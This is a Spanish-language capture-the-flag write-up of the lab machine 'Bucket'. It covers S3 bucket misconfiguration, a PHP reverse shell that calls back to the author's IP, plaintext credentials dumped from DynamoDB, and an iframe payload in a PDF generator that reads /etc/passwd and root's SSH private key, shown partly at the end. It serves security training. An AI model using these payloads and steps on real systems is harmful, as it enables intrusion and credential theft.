insertamos HTML para obtener la clave privada de SSH de root.\nInformacion de la Maquina    Nombre Bucket      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.212   Maker MrR3boot    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.7, 7.1, 4.2, 5.8, 2.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 10, 4, 6, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.91 scan initiated Fri Mar 19 18:25:42 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.212 Warning: 10.10.10.212 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.094s latency). Not shown: 40661 closed ports, 24872 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Mar 19 18:26:54 2021 -- 1 IP address (1 host up) scanned in 72.43 seconds # Nmap 7.91 scan initiated Fri Mar 19 18:27:14 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.212 Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.070s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://bucket.htb/ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 19 18:27:24 2021 -- 1 IP address (1 host up) scanned in 9.80 seconds   HTTP Al intentar visitar el puerto 80 nos redirigia al dominio bucket.htb el cual agregamos en el archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  HTTP/1.1 302 Found Date: Sat, 20 Mar 2021 00:03:45 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://bucket.htb/ Content-Length: 280 Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://bucket.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;   Al visitar la pagina encontramos una pagina web con una lista de anuncios de \u0026ldquo;servicios\u0026rdquo;, cada una de estas estaba listada con una imagen la cual no cargaba. Al revisar el codigo fuente de las imagenes encontramos un sub dominio el cual agregamos nuevamente al archivo /etc/hosts.\nGOBUSTER Realizamos una enumeracion de directorios y archivos en el dominio bucket.htb y s3.bucket.htb.\n1 2 3 4 5  #bucket.htb ┌──(kali㉿kali)-[~/htb/bucket] └─$ gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q -x php,html,txt,xmlb /index.html (Status: 200) /server-status (Status: 403)   1 2 3 4 5 6  #s3.bucket.htb ┌──(kali㉿kali)-[~/htb/bucket] └─$ gobuster dir -u s3.bucket.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,xml,js -q /health (Status: 200) /shell (Status: 200) /server-status (Status: 403)   AWS BUCKET En el dominio \u0026ldquo;principal\u0026rdquo; solamente encontramos la pagina estatica. En el subdmominio encontramos dos direcciones, en la primera encontramos que aparentemente estan corriendo \u0026lsquo;s3\u0026rsquo; y \u0026lsquo;dynamodb\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10  ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/health {\u0026#34;services\u0026#34;: {\u0026#34;s3\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;dynamodb\u0026#34;: \u0026#34;running\u0026#34;}} ──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/s3 {\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;} ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/dynamodb {\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;}   Para la segunda direccion fue diferente ya que redirigía hacia otra direccion http://444af250749d:4566/shell/, la cual tiene \u0026ldquo;disponible\u0026rdquo; o \u0026ldquo;permitidos\u0026rdquo; algunos metodos HTTP.\n1 2 3 4 5 6 7 8 9 10  HTTP/1.1 200 Date: Sat, 20 Mar 2021 00:07:29 GMT Server: hypercorn-h11 content-type: text/html; charset=utf-8 content-length: 0 refresh: 0; url=http://444af250749d:4566/shell/ access-control-allow-origin: * access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging access-control-expose-headers: x-amz-version-id   Ingresamos direcciones random y encontramos un mensaje de error, despues de investigar sobre este error encontramos que está relacionado con AWS S3 Buckets.\n1 2 3 4 5 6 7 8  #http://s3.bucket.htb/dynamodb/hello \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;The specified bucket does not exist\u0026lt;/Message\u0026gt; \u0026lt;BucketName\u0026gt;dynamodb\u0026lt;/BucketName\u0026gt; \u0026lt;RequestID\u0026gt;7a62c49f-347e-4fc4-9331-6e8eEXAMPLE\u0026lt;/RequestID\u0026gt; \u0026lt;/Error\u0026gt;   En el post se especifica que se puede utilizar la API de Amazon S3 o la consola AWS para realizar operaciones de implementacion, creacion y/o subida de objetos a un bucket.\nIn terms of implementation, buckets and objects are AWS resources, and Amazon S3 provides APIs for you to manage them. For example, you can create a bucket and upload objects using the Amazon S3 API. You can also use the Amazon S3 console to perform these operations. The console uses the Amazon S3 APIs to send requests to Amazon S3.\nTambien encontramos que pueden existir malas configuraciones en un bucket las cuales puedan permitir acceder a informacion en este.\nRealizamos la instalacion y configuracion de aws cli, utilizamos la configuracion de ejemplo. Encontramos que existe un bucket llamado adserver y el bucket no está configurado correctamente ya que no solicita ningun tipo de autenticacion o mensaje de acceso.\n1 2 3 4 5 6 7 8 9 10  ──(kali㉿kali)-[~/htb/bucket] └─$ aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Default region name [None]: us-west-2 Default output format [None]: json ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb/ 2021-03-19 20:31:08 adserver   WWW-DATA - USER Listamos los permisos del bucket y encontramos que el \u0026ldquo;usuario\u0026rdquo; es \u0026ldquo;webfile\u0026rdquo; y que tiene permisos FULL_CONTROL del bucket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3api get-bucket-acl --bucket adserver --endpoint-url http://s3.bucket.htb { \u0026#34;Owner\u0026#34;: { \u0026#34;DisplayName\u0026#34;: \u0026#34;webfile\u0026#34;, \u0026#34;ID\u0026#34;: \u0026#34;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a\u0026#34; }, \u0026#34;Grants\u0026#34;: [ { \u0026#34;Grantee\u0026#34;: { \u0026#34;ID\u0026#34;: \u0026#34;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;CanonicalUser\u0026#34; }, \u0026#34;Permission\u0026#34;: \u0026#34;FULL_CONTROL\u0026#34; } ] }   Al tener este permiso permite al usuario:\n   Permiso Permite en el Bucket      FULL_CONTROL Allows grantee the READ, WRITE, READ_ACP, and WRITE_ACP permissions on the bucket     De tal forma que podriamos listar los archivos que existen en el bucket.\n1 2 3 4 5 6 7 8 9 10  ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver PRE images/ 2021-03-19 20:45:11 5344 index.html ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver/images/ 2021-03-19 20:53:12 37840 bug.jpg 2021-03-19 20:53:12 51485 cloud.png 2021-03-19 20:53:12 16486 malware.png   Además podemos subir archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat me.php \u0026lt;?php echo \u0026#34;s3 bucket adserver\u0026#34;; ?\u0026gt; ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 cp me.php --endpoint-url http://s3.bucket.htb s3://adserver/me.php upload: ./me.php to s3://adserver/me.php ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb adserver/ PRE images/ 2021-03-19 20:57:13 5344 index.html 2021-03-19 20:57:38 36 me.php ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -s -X GET http://bucket.htb/me.php s3 bucket adserver   Sabiendo que podemos subir archivos, subimos una shell inversa con la cual logramos obtener una shell con el usuario www-data.\n1  \u0026lt;?php $sock=fsockopen(\u0026#34;10.10.14.178\u0026#34;,1445);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes); ?\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14  ┌──(kali㉿kali)-[~/htb/bucket] └─$ nc -lvp 1445 listening on [any] 1445 ... connect to [10.10.14.178] from bucket.htb [10.10.10.212] 45404 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@bucket:/var/www/html$ pwd pwd /var/www/html   DYNAMODB \u0026gt; USER Dentro de los procesos encontramos que dynamodb esta siendo ejecutado, además vemos algunos puertos corriendo localmente, ingestigamos acerca del archivo jar especificado en el proceso y encontramos que es dynamodb y que puede ser accedido atraves del cli de aws: AWS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  [... REDACTED ...] root 1758 1688 0 Mar19 ? 00:00:24 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -sharedDb -port 60571 -inMemo ry [... REDACTED ...] www-data@bucket:/tmp$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46305 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN -   Verificamos que aws cli estuviera instalado en la maquina, tambien configuramos nuestras credenciales y nuestra variable $HOME para que aws tuviera permisos de escritura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  www-data@bucket:/tmp$ which aws which aws /usr/bin/aws www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:8000 \u0026lt;db list-tables --endpoint-url http://localhost:8000 You must specify a region. You can also configure your region by running \u0026#34;aws configure\u0026#34;. www-data@bucket:/tmp$ aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE [... REDACTED ...] [Errno 13] Permission denied: \u0026#39;/var/www/.aws\u0026#39; www-data@bucket:/tmp$ export HOME=/dev/shm export HOME=/dev/shm www-data@bucket:/tmp$ echo $HOME echo $HOME /dev/shm www-data@bucket:/tmp$ aws configure aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE AKIAIOSFODNN7EXAMPLE AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Default region name [None]: us-west-2 us-west-2 Default output format [None]: json json www-data@bucket:/tmp$   Intentamos realizar un query a dynamo localmente a los diferentes puertos con lo que logramos observar las tablas existentes y descripcion, además logramos obtener credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81  www-data@bucket:/tmp$ aws dynamodb list-tables --endpoint-url http://localhost:4566 \u0026lt;db list-tables --endpoint-url http://localhost:4566 { \u0026#34;TableNames\u0026#34;: [ \u0026#34;users\u0026#34; ] } www-data@bucket:/tmp$ aws dynamodb describe-table --table-name users --endpoint-url http://localhost:4566 \u0026lt;ble-name users --endpoint-url http://localhost:4566 { \u0026#34;Table\u0026#34;: { \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; } ], \u0026#34;TableName\u0026#34;: \u0026#34;users\u0026#34;, \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;HASH\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;RANGE\u0026#34; } ], \u0026#34;TableStatus\u0026#34;: \u0026#34;ACTIVE\u0026#34;, \u0026#34;CreationDateTime\u0026#34;: 1616193915.52, \u0026#34;ProvisionedThroughput\u0026#34;: { \u0026#34;LastIncreaseDateTime\u0026#34;: 0.0, \u0026#34;LastDecreaseDateTime\u0026#34;: 0.0, \u0026#34;NumberOfDecreasesToday\u0026#34;: 0, \u0026#34;ReadCapacityUnits\u0026#34;: 5, \u0026#34;WriteCapacityUnits\u0026#34;: 5 }, \u0026#34;TableSizeBytes\u0026#34;: 107, \u0026#34;ItemCount\u0026#34;: 3, \u0026#34;TableArn\u0026#34;: \u0026#34;arn:aws:dynamodb:us-east-1:000000000000:table/users\u0026#34; } } www-data@bucket:/tmp$ aws dynamodb scan --table-name users --endpoint-url http://localhost:4566 \u0026lt;ble-name users --endpoint-url http://localhost:4566 { \u0026#34;Items\u0026#34;: [ { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Management@#1@#\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Mgmt\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Welcome123!\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Cloudadm\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;n2vM-\u0026lt;_K_Q:.Aa2\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Sysadm\u0026#34; } } ], \u0026#34;Count\u0026#34;: 3, \u0026#34;ScannedCount\u0026#34;: 3, \u0026#34;ConsumedCapacity\u0026#34;: null } www-data@bucket:/tmp$   1 2 3  Mgmt:Management@#1@# Cloudadm:Welcome123! Sysadm:n2vM-\u0026lt;_K_Q:.Aa2   Utilizamos una de las contraseñas para escalar al usuario roy lo cual funcionó, logramos obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@bucket:/tmp$ su roy su roy Password: n2vM-\u0026lt;_K_Q:.Aa2 roy@bucket:/tmp$ cd cd roy@bucket:~$ ls ls project user.txt roy@bucket:~$ cat user.txt cat user.txt 8c89a136f4f790b62af13feac9760790 roy@bucket:~$   PRIVILEGE ESCALATION PSPY Utilizamos pspy para ver los cronjobs que son ejecutados y observamos que el usuario root elimina archivos en la carpeta de \u0026ldquo;objetos\u0026rdquo; del bucket adsever, basicamente restaura archivos y el estado del bucket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  2021/03/20 01:49:01 CMD: UID=0 PID=819089 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819088 | rm /var/www/bucket-app/files/* 2021/03/20 01:49:01 CMD: UID=0 PID=819087 | /bin/sh -c rm /var/www/bucket-app/files/* 2021/03/20 01:49:01 CMD: UID=0 PID=819086 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819085 | /usr/sbin/CRON -f 2021/03/20 01:49:01 CMD: UID=0 PID=819090 | /bin/bash /root/sync.sh 2021/03/20 01:49:01 CMD: UID=0 PID=819092 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /root/files/ --exclude *.png --exclude *.jpg 2021/03/20 01:49:01 CMD: UID=0 PID=819104 | 2021/03/20 01:49:02 CMD: UID=0 PID=819105 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 rm s3://adserver --recursive 2021/03/20 01:49:02 CMD: UID=0 PID=819106 | /lib/systemd/systemd-udevd 2021/03/20 01:49:02 CMD: UID=0 PID=819125 | /bin/bash /root/restore.sh 2021/03/20 01:49:03 CMD: UID=0 PID=819129 | /bin/bash /root/restore.sh 2021/03/20 01:49:03 CMD: UID=0 PID=819130 | 2021/03/20 01:49:03 CMD: UID=0 PID=819133 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync /root/backups/ s3://adserver 2021/03/20 01:49:04 CMD: UID=0 PID=819134 | 2021/03/20 01:49:04 CMD: UID=0 PID=819154 | cp -R /root/backups/index.html /var/www/html/ 2021/03/20 01:49:04 CMD: UID=0 PID=819155 | /usr/bin/php /root/restore.php   DYNAMODB \u0026gt; PD4CMD \u0026gt; SSH ROOT En los archivos del bucket, al inicio del archivo index.php encontramos que este puede recibir peticiones POST especificamente los datos action=get_alerts lo cual crearía una nueva conexion con DynamoDB y, obtendría los datos de la tabla alerts por titulo (title) y que este ultimo contenga el valor Ransomware, luego, realizaría un for para obtener la informacion individual (fila[data]) con lo que crearía un archivo con un nombre random dentro de la carpeta file/, al finalizar ejecuta pd4ml (html a pdf) para crear un archivo con el nombre result.pdf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  roy@bucket:/var/www/bucket-app$ cat index.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([\u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39;]); $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array(\u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array( \u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;) ), )); foreach ($iterator as $item) { $name=rand(1,10000).\u0026#39;.html\u0026#39;; file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); } passthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\u0026#34;); } }else{ ?\u0026gt;   Ya que este proceso es ejecutado por el usuario root podriamos aprovecharnos ya que crearia archivos html y estos los \u0026ldquo;ejecutaria\u0026rdquo;, en estos archivos podriamos leer archivos utilizando etiquetas como \u0026lt;iframe\u0026gt; u \u0026lt;object\u0026gt;.\nPrimero debemos de crear la tabla alerts la cual no existe.\n1 2 3 4 5 6  aws dynamodb create-table \\ \t--table-name alerts \\ \t--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \\  --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \\ \t--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 \\ \t--endpoint-url http://localhost:4566   Ingresamos la informacion a la tabla con nuestro \u0026ldquo;payload\u0026rdquo; para lectura del archivo /etc/passwd.\n1 2 3  aws dynamodb put-item \\ \t--table-name alerts \\ \t--item \u0026#39;{\u0026#34;title\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34;}, \u0026#34;data\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;iframe src=/etc/passwd width=1000 height=400 frameborder=0 \u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;} }\u0026#39;   Copiamos los archivos que se encuentran en /var/www/bucket-app/files/ a nuestra carpeta principal y luego a nuestra maquina, vemos que el archivo pdf logró realizar la lectura del archivo /etc/passwd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ┌──(kali㉿kali)-[~/htb/bucket] └─$ pdftotext result.pdf result.txt ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat result.txt root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/s news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management :/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemdtimesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM soft :/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin roy:x:1 :/home/roy:/bin/bash pd4ml evaluation copy. visit http://pd4ml.com   Hay que mencionar que el anterior proceso se realizo de manera rapida y conjunta ya que existe un cron que restaura la carpeta y el bucket, además elimina los archivos creados en /var/www/bucket-app/files/, por lo que se utilizaron dos consolas.\n1 2 3 4 5  #CONSOLA 1 aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://localhost:4566 \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; aws dynamodb put-item --table-name alerts --item \u0026#39;{\u0026#34;title\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34;}, \u0026#34;data\u0026#34;: {\u0026#34;S\u0026#34;: \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;iframe src=/etc/passwd width=1000 height=400\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;} }\u0026#39; --endpoint-url http://localhost:4566 #CONSOLA 2 aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566 \u0026amp;\u0026amp; curl -s -d \u0026#34;action=get_alerts\u0026#34; http://localhost:8000/ \u0026amp;\u0026amp; sleep 2 \u0026amp;\u0026amp; ls -lah /var/www/bucket-app/files/ \u0026amp;\u0026amp; cp /var/www/bucket-app/files/* $HOME/ \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; ls -lah   Utilizamos los mismos comandos pero esta vez para obtener la clave privada del usuario root que posiblemente se encuentra en /root/.ssh/id_rsa. Luego de obtener el pdf logramos leer la clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ┌──(kali㉿kali)-[~/htb/bucket] └─$ pdftotext it.pdf it.txt ┌──(kali㉿kali)-[~/htb/bucket] └─$ cat it.txt -----BEGIN OPENSSH PRIVATE KEY----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU bQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm8 [... REDACTED ...] ZhpVP0sGJN6uKIvg9p4SD6X8JBdwCtTP8AAADBAOBYuz8OdgDKw5OzZxWeBq80+n0yXUeZ EtZFCf5z4q4laryzqyyPxUEOPTxpABbmnQjOq6clMtTnJhgAf/THSKnsGb8RABLXG/KSAh pHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/ 